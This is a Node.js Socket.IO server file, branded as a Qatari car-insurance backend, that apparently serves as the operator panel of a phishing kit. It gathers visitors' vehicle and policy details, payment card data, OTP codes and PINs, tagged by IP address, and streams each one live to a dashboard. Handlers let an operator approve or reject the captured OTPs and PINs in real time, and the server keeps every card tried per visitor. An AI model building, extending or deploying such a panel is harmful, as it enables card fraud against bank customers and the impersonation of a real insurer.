// server.js - Real-time Backend with Socket.IO
require('dotenv').config();

const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const bodyParser = require('body-parser');
const cors = require('cors');
const helmet = require('helmet');
const rateLimit = require('express-rate-limit');

const app = express();
const server = http.createServer(app);

// 🔒 Security: Helmet middleware
app.use(helmet({
  contentSecurityPolicy: false, // Disable for Socket.IO
  crossOriginEmbedderPolicy: false
}));

// 🔒 Security: Rate Limiting
const limiter = rateLimit({
  windowMs: parseInt(process.env.RATE_LIMIT_WINDOW_MS) || 15 * 60 * 1000, // 15 min
  max: parseInt(process.env.RATE_LIMIT_MAX) || 100, // limit each IP
  message: '❌ Too many requests, please try again later.'
});
app.use('/api/', limiter);

// Get CORS origins from environment
const corsOrigins = process.env.CORS_ORIGIN 
  ? process.env.CORS_ORIGIN.split(',').map(o => o.trim())
  : ['http://localhost:5173', 'http://localhost:3000'];

const io = new Server(server, {
  cors: {
    origin: corsOrigins,
    methods: ['GET', 'POST'],
    credentials: true
  }
});

app.use(cors({
  origin: corsOrigins,
  credentials: true
}));
app.use(bodyParser.json());

// مخزن مؤقت للبيانات - استبدل بقاعدة بيانات حقيقية
let customerEntries = [
  {
    id: 1,
    name: 'أحمد محمد الكعبي',
    phone: '+97455123456',
    email: 'ahmed@example.com',
    qid: '28512345678',
    vehicleType: 'سيدان',
    vehicleMake: 'تويوتا',
    vehicleModel: 'كامري',
    vehicleYear: '2023',
    plateNumber: '12345',
    insuranceType: 'شامل',
    policyStartDate: '2025-01-01',
    totalAmount: '4736.00',
    status: 'مكتمل',
    createdAt: new Date().toISOString()
  },
  {
    id: 2,
    name: 'فاطمة علي السليطي',
    phone: '+97455987654',
    email: 'fatima@example.com',
    qid: '28598765432',
    vehicleType: 'SUV',
    vehicleMake: 'نيسان',
    vehicleModel: 'باترول',
    vehicleYear: '2024',
    plateNumber: '67890',
    insuranceType: 'ضد الغير',
    policyStartDate: '2025-01-15',
    totalAmount: '3200.00',
    status: 'قيد المعالجة',
    createdAt: new Date(Date.now() - 3600000).toISOString()
  }
];

let policyEntries = [];
let claimEntries = [];
let vehicleEntries = [];

// نظام تتبع البيانات من الصفحات المختلفة
let carDetailsData = [
  {
    ip: '192.168.1.100',
    vehicleType: 'سيدان',
    vehicleMake: 'تويوتا',
    vehicleModel: 'كامري',
    vehicleYear: '2023',
    timestamp: new Date()
  },
  {
    ip: '192.168.1.101',
    vehicleType: 'SUV',
    vehicleMake: 'نيسان',
    vehicleModel: 'باترول',
    vehicleYear: '2024',
    timestamp: new Date(Date.now() - 300000)
  }
];
let moreDetailsData = [];
let selectInsuranceData = [];
let plateNumberData = [];
let insuranceInfoData = [];
let policyDateData = [];
let quoteData = [];
let paymentData = [
  {
    ip: '192.168.1.100',
    paymentMethod: 'DCC',
    cardHolderName: 'أحمد محمد',
    amount: 4500,
    status: 'pending',
    timestamp: new Date()
  }
];

// Track OTP and PIN codes
let otpCodesData = [];
let pinCodesData = [];

// Track active users
let activeUsers = new Map(); // Map<socketId, ip>

// All entries in standardized format for comprehensive tracking
let allEntries = [];

// Page-to-Event mapping for broadcasting
const PAGE_EVENT_MAP = {
  '/car-details': 'newCarDetails',
  '/more-details': 'newMoreDetails',
  '/select-insurance': 'newSelectInsurance',
  '/plate-number': 'newPlateNumber',
  '/insurance-info': 'newInsuranceInfo',
  '/policy-date': 'newPolicyDate',
  '/quote': 'newQuote',
  '/payment': 'newPayment',
  '/payment-otp': 'newOTP',
  '/payment-pin': 'newPIN'
};

/**
 * Broadcast entry with full payload to all connected clients
 * @param {Object} entry - { id, sourcePage, payload, submittedAt }
 */
function broadcastEntry(entry) {
  const normalized = {
    id: entry.id || Date.now() + Math.floor(Math.random() * 1000),
    sourcePage: entry.sourcePage || '/unknown',
    payload: entry.payload || {},
    submittedAt: entry.submittedAt || new Date().toISOString()
  };
  
  // Store in allEntries
  allEntries.push(normalized);
  
  // Emit page-specific event
  const eventName = PAGE_EVENT_MAP[normalized.sourcePage] || 'newEntry';
  io.emit(eventName, normalized);
  
  // Emit generic event for comprehensive listeners
  io.emit('newEntryAll', normalized);
  
  console.log(`📡 Broadcasted: ${eventName}`, normalized.sourcePage);
}

// Middleware للتحقق من JWT (مبسط للمثال)
const authenticateSocket = (socket, next) => {
  const token = socket.handshake.auth.token;
  // في الإنتاج: تحقق من JWT هنا
  if (!token && process.env.NODE_ENV === 'production') {
    return next(new Error('Authentication error'));
  }
  next();
};

io.use(authenticateSocket);

// عند اتصال Socket جديد
io.on('connection', (socket) => {
  console.log('✅ Client connected:', socket.id);

  // Track user connection
  socket.on('userIdentify', ({ ip }) => {
    activeUsers.set(socket.id, ip);
    io.emit('userConnected', { ip });
    console.log(`👤 User identified: ${ip}`);
  });

  // إرسال البيانات الابتدائية
  socket.emit('initialCustomers', customerEntries.slice().reverse());
  socket.emit('initialPolicies', policyEntries.slice().reverse());
  socket.emit('initialClaims', claimEntries.slice().reverse());
  socket.emit('initialVehicles', vehicleEntries.slice().reverse());

  // الاستماع لطلبات البيانات
  socket.on('requestCustomers', () => {
    socket.emit('initialCustomers', customerEntries.slice().reverse());
  });

  // معالج loadData - إرسال جميع البيانات
  socket.on('loadData', () => {
    console.log('📤 Sending all data to dashboard');
    socket.emit('initialData', {
      carDetails: carDetailsData,
      moreDetails: moreDetailsData,
      selectInsurance: selectInsuranceData,
      plateNumber: plateNumberData,
      insuranceInfo: insuranceInfoData,
      policyDate: policyDateData,
      quote: quoteData,
      payment: paymentData,
      otpCodes: otpCodesData,
      pinCodes: pinCodesData,
      activeUsers: Array.from(activeUsers.values())
    });
  });

  // 🆕 NEW: Allow admin to request ALL entries with filters
  socket.on('requestAll', async (opts = {}) => {
    console.log('📊 Admin requesting all entries:', opts);
    try {
      let data = [...allEntries].reverse(); // newest first
      
      // Apply filters
      if (opts.page) {
        data = data.filter(e => e.sourcePage === opts.page);
      }
      if (opts.since) {
        const sinceDate = new Date(opts.since);
        data = data.filter(e => new Date(e.submittedAt) >= sinceDate);
      }
      
      // Apply limit
      const limit = Math.min(parseInt(opts.limit || '5000', 10), 50000);
      data = data.slice(0, limit);
      
      socket.emit('bulkEntries', {
        count: data.length,
        entries: data,
        filters: opts
      });
      
      console.log(`✅ Sent ${data.length} entries to admin`);
    } catch (err) {
      console.error('❌ requestAll error:', err);
      socket.emit('error', { message: 'Failed to fetch all data' });
    }
  });

  // استقبال بيانات تفاصيل السيارة
  socket.on('submitCarDetails', (data) => {
    console.log('🚗 Received car details:', data);
    const existingIndex = carDetailsData.findIndex(item => item.ip === data.ip);
    const entry = { ...data, timestamp: new Date() };
    
    if (existingIndex >= 0) {
      carDetailsData[existingIndex] = entry;
    } else {
      carDetailsData.push(entry);
    }
    
    // Broadcast using standardized format
    broadcastEntry({
      id: `car-${data.ip}-${Date.now()}`,
      sourcePage: '/car-details',
      payload: entry,
      submittedAt: entry.timestamp.toISOString()
    });
  });

  // استقبال بيانات المزيد من التفاصيل
  socket.on('submitMoreDetails', (data) => {
    console.log('📋 Received more details:', data);
    const existingIndex = moreDetailsData.findIndex(item => item.ip === data.ip);
    if (existingIndex >= 0) {
      moreDetailsData[existingIndex] = { ...data, timestamp: new Date() };
    } else {
      moreDetailsData.push({ ...data, timestamp: new Date() });
    }
    io.emit('newMoreDetails', data);
  });

  // استقبال اختيار التأمين
  socket.on('submitSelectInsurance', (data) => {
    console.log('🛡️ Received insurance selection:', data);
    const existingIndex = selectInsuranceData.findIndex(item => item.ip === data.ip);
    if (existingIndex >= 0) {
      selectInsuranceData[existingIndex] = { ...data, timestamp: new Date() };
    } else {
      selectInsuranceData.push({ ...data, timestamp: new Date() });
    }
    io.emit('newSelectInsurance', data);
  });

  // استقبال رقم اللوحة
  socket.on('submitPlateNumber', (data) => {
    console.log('🔢 Received plate number:', data);
    const existingIndex = plateNumberData.findIndex(item => item.ip === data.ip);
    if (existingIndex >= 0) {
      plateNumberData[existingIndex] = { ...data, timestamp: new Date() };
    } else {
      plateNumberData.push({ ...data, timestamp: new Date() });
    }
    io.emit('newPlateNumber', data);
  });

  // استقبال معلومات التأمين
  socket.on('submitInsuranceInfo', (data) => {
    console.log('👤 Received insurance info:', data);
    const existingIndex = insuranceInfoData.findIndex(item => item.ip === data.ip);
    if (existingIndex >= 0) {
      insuranceInfoData[existingIndex] = { ...data, timestamp: new Date() };
    } else {
      insuranceInfoData.push({ ...data, timestamp: new Date() });
    }
    io.emit('newInsuranceInfo', data);
  });

  // استقبال تاريخ الوثيقة
  socket.on('submitPolicyDate', (data) => {
    console.log('📅 Received policy date:', data);
    const existingIndex = policyDateData.findIndex(item => item.ip === data.ip);
    if (existingIndex >= 0) {
      policyDateData[existingIndex] = { ...data, timestamp: new Date() };
    } else {
      policyDateData.push({ ...data, timestamp: new Date() });
    }
    io.emit('newPolicyDate', data);
  });

  // استقبال عرض السعر
  socket.on('submitQuote', (data) => {
    console.log('💰 Received quote:', data);
    const existingIndex = quoteData.findIndex(item => item.ip === data.ip);
    if (existingIndex >= 0) {
      quoteData[existingIndex] = { ...data, timestamp: new Date() };
    } else {
      quoteData.push({ ...data, timestamp: new Date() });
    }
    io.emit('newQuote', data);
  });

  // استقبال بيانات الدفع - يسمح بتسجيل بطاقات متعددة
  socket.on('submitPayment', (data) => {
    console.log('💳 Received payment:', data);
    // Always push new payment (don't replace, allow multiple cards per IP)
    const paymentWithTimestamp = { 
      ...data, 
      timestamp: data.timestamp || new Date().toISOString()
    };
    paymentData.push(paymentWithTimestamp);
    
    // Broadcast using standardized format
    broadcastEntry({
      id: `payment-${data.ip}-${Date.now()}`,
      sourcePage: '/payment',
      payload: paymentWithTimestamp,
      submittedAt: paymentWithTimestamp.timestamp
    });
  });

  // الموافقة على الدفع
  socket.on('approvePayment', ({ ip }) => {
    console.log('✅ Payment approved for IP:', ip);
    // إرسال حالة الموافقة للعميل
    io.emit('paymentStatus', {
      ip,
      status: 'approved',
      message: 'تم قبول الدفع بنجاح'
    });
  });

  // رفض الدفع
  socket.on('rejectPayment', ({ ip }) => {
    console.log('❌ Payment rejected for IP:', ip);
    // إرسال حالة الرفض للعميل
    io.emit('paymentStatus', {
      ip,
      status: 'rejected',
      message: 'تم رفض عملية الدفع'
    });
  });

  // استقبال OTP
  socket.on('submitOTP', (data) => {
    console.log('🔐 Received OTP:', data);
    otpCodesData.push({ ...data, timestamp: new Date() });
    io.emit('otpSubmitted', { ...data, timestamp: new Date() });
  });

  // استقبال PIN
  socket.on('submitPIN', (data) => {
    console.log('🔑 Received PIN:', data);
    pinCodesData.push({ ...data, timestamp: new Date() });
    io.emit('pinSubmitted', { ...data, timestamp: new Date() });
  });

  // موافقة على OTP
  socket.on('approveOTP', ({ ip }) => {
    console.log('✅ OTP approved for IP:', ip);
    io.emit('otpVerificationStatus', { ip, status: 'approved' });
  });

  // رفض OTP
  socket.on('rejectOTP', ({ ip }) => {
    console.log('❌ OTP rejected for IP:', ip);
    io.emit('otpVerificationStatus', { ip, status: 'rejected' });
  });

  // موافقة على PIN
  socket.on('approvePIN', ({ ip }) => {
    console.log('✅ PIN approved for IP:', ip);
    io.emit('pinVerificationStatus', { ip, status: 'approved' });
  });

  // رفض PIN
  socket.on('rejectPIN', ({ ip }) => {
    console.log('❌ PIN rejected for IP:', ip);
    io.emit('pinVerificationStatus', { ip, status: 'rejected' });
  });

  socket.on('disconnect', () => {
    console.log('❌ Client disconnected:', socket.id);
    const userIp = activeUsers.get(socket.id);
    if (userIp) {
      activeUsers.delete(socket.id);
      io.emit('userDisconnected', { ip: userIp });
      console.log(`👋 User disconnected: ${userIp}`);
    }
  });
});

// 🆕 HTTP API endpoint to get ALL entries with filters
app.get('/api/entries', (req, res) => {
  try {
    const page = req.query.page;
    const since = req.query.since;
    const limit = Math.min(parseInt(req.query.limit || '5000', 10), 100000);
    
    let data = [...allEntries].reverse(); // newest first
    
    // Apply filters
    if (page) {
      data = data.filter(e => e.sourcePage === page);
    }
    if (since) {
      const sinceDate = new Date(since);
      data = data.filter(e => new Date(e.submittedAt) >= sinceDate);
    }
    
    // Apply limit
    data = data.slice(0, limit);
    
    res.json({ 
      success: true, 
      count: data.length, 
      entries: data,
      filters: { page, since, limit }
    });
    
    console.log(`📊 HTTP: Sent ${data.length} entries`);
  } catch (err) {
    console.error('❌ GET /api/entries error:', err);
    res.status(500).json({ success: false, error: 'Server error' });
  }
});

// 🆕 HTTP API endpoint to submit new entry
app.post('/api/submit', (req, res) => {
  try {
    const { sourcePage, payload } = req.body;
    
    if (!sourcePage || !payload) {
      return res.status(400).json({ 
        success: false, 
        error: 'sourcePage and payload are required' 
      });
    }
    
    const entry = {
      id: `${sourcePage}-${Date.now()}-${Math.floor(Math.random() * 1000)}`,
      sourcePage,
      payload,
      submittedAt: new Date().toISOString()
    };
    
    // Broadcast to all connected clients
    broadcastEntry(entry);
    
    res.status(201).json({ success: true, data: entry });
  } catch (err) {
    console.error('❌ POST /api/submit error:', err);
    res.status(500).json({ success: false, error: 'Server error' });
  }
});

// 🆕 Get client IP address (replaces api.ipify.org)
app.get('/api/client-ip', (req, res) => {
  const ip = req.headers['x-forwarded-for']?.split(',')[0] || 
            req.headers['x-real-ip'] || 
            req.socket.remoteAddress || 
            req.connection.remoteAddress;
  res.json({ ip: ip?.replace('::ffff:', '') || '127.0.0.1' });
});

// API لإضافة عميل جديد
app.post('/api/customers', (req, res) => {
  try {
    const payload = req.body;
    const id = customerEntries.length ? Math.max(...customerEntries.map(e => e.id)) + 1 : 1;
    const newEntry = {
      id,
      ...payload,
      status: payload.status || 'جديد',
      createdAt: new Date().toISOString()
    };
    
    customerEntries.unshift(newEntry);

    // بث التحديث لجميع المتصلين
    io.emit('newCustomer', newEntry);
    console.log('📢 New customer broadcasted:', newEntry.name);

    res.status(201).json({ success: true, data: newEntry });
  } catch (error) {
    console.error('Error adding customer:', error);
    res.status(500).json({ success: false, error: error.message });
  }
});

// API لإضافة بوليصة جديدة
app.post('/api/policies', (req, res) => {
  try {
    const payload = req.body;
    const id = policyEntries.length ? Math.max(...policyEntries.map(e => e.id)) + 1 : 1;
    const newEntry = {
      id,
      ...payload,
      createdAt: new Date().toISOString()
    };
    
    policyEntries.unshift(newEntry);
    io.emit('newPolicy', newEntry);

    res.status(201).json({ success: true, data: newEntry });
  } catch (error) {
    res.status(500).json({ success: false, error: error.message });
  }
});

// API لإضافة مطالبة جديدة
app.post('/api/claims', (req, res) => {
  try {
    const payload = req.body;
    const id = claimEntries.length ? Math.max(...claimEntries.map(e => e.id)) + 1 : 1;
    const newEntry = {
      id,
      ...payload,
      createdAt: new Date().toISOString()
    };
    
    claimEntries.unshift(newEntry);
    io.emit('newClaim', newEntry);

    res.status(201).json({ success: true, data: newEntry });
  } catch (error) {
    res.status(500).json({ success: false, error: error.message });
  }
});

// API للحصول على جميع العملاء
app.get('/api/customers', (req, res) => {
  const page = parseInt(req.query.page) || 1;
  const limit = parseInt(req.query.limit) || 50;
  const start = (page - 1) * limit;
  const end = start + limit;

  res.json({
    success: true,
    data: customerEntries.slice(start, end),
    total: customerEntries.length,
    page,
    totalPages: Math.ceil(customerEntries.length / limit)
  });
});

// API للحصول على جميع البوليصات
app.get('/api/policies', (req, res) => {
  res.json({ success: true, data: policyEntries, total: policyEntries.length });
});

// API للحصول على جميع المطالبات
app.get('/api/claims', (req, res) => {
  res.json({ success: true, data: claimEntries, total: claimEntries.length });
});

// API للحصول على الإحصائيات
app.get('/api/stats', (req, res) => {
  res.json({
    success: true,
    data: {
      totalCustomers: customerEntries.length,
      totalPolicies: policyEntries.length,
      totalClaims: claimEntries.length,
      totalVehicles: vehicleEntries.length,
      activeConnections: io.engine.clientsCount
    }
  });
});

// Health check
app.get('/health', (req, res) => {
  res.json({ status: 'ok', timestamp: new Date().toISOString() });
});

const PORT = process.env.PORT || 4000;
server.listen(PORT, () => {
  console.log(`
╔═══════════════════════════════════════╗
║  🚀 QIC Real-time Server Running      ║
║  📡 Port: ${PORT}                        ║
║  🔌 Socket.IO: Active                 ║
║  ⏰ ${new Date().toLocaleString('ar-QA')}     ║
╚═══════════════════════════════════════╝
  `);
});

module.exports = { app, server, io };
